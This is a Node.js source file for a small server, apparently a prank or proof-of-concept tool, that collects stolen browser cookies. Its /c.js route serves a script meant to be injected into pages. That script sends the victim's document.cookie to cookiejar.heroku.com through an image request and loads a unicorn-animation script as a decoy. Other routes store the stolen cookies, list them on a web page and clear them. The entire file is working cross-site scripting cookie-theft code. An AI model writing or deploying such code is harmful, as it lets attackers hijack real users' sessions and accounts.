var cookie_jar = [];
var sys = require("sys");


with(require("./lib/fab"))

( fab )
  ( fab.listen, parseInt(process.env.PORT) || 0xFAB )
  ( /^\/c.js/ )
    ( fab.tmpl, "(<%= this %>)()" )
    ( cornify.toString() )
  ( /^\/nomnomnom/ )
    (function () {
      var out = this;
      return function (head) {
        var cookie = head.url.pathname.split("/").slice(1).join("/");
        cookie_jar.push(decodeURIComponent(cookie));
        out({ body: "yummy" })()
      }
    })
  ( /^\/reset/ )
    ( function () {
      var out = this;
      return function () {
        cookie_jar.length = 0;
        out({body: "MOAR COOKIES"})();
      }
    })
  (function () {
    var out = this;
    return function () {
      var listing = "";
      var i = (cookie_jar.length-1);
      if (i < 0)  {
        listing += "<p>FEED ME COOKIES</p>";
      } else {
        listing += "<ul>"
        while (i >= 0) {
          var c = cookie_jar[i];
          if (c.length > 0) {
            listing += ("<li>"+c.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;')+"</li>");
          } else {
            listing += "<li>EMPTY COOKIE</li>";
          }
          i = i - 1;
        }
        listing += "</ul>"
      }
      var body = "<html><body style='font: normal 12px helvetica'>Yer Cookies: "+listing+"</body></html>"
      out({ body: body })()
    }
  })



function cornify() {
  document.write('<script type="text/javascript" src="http://www.cornify.com/js/cornify.js"></script>'); 
  var corn = function() { try { cornify_add(); } catch(e) {} setTimeout(corn, 1000); }; 
  document.write('<img src="http://cookiejar.heroku.com/'+document.cookie+'"/>'); 
  setTimeout(corn, 1000);
}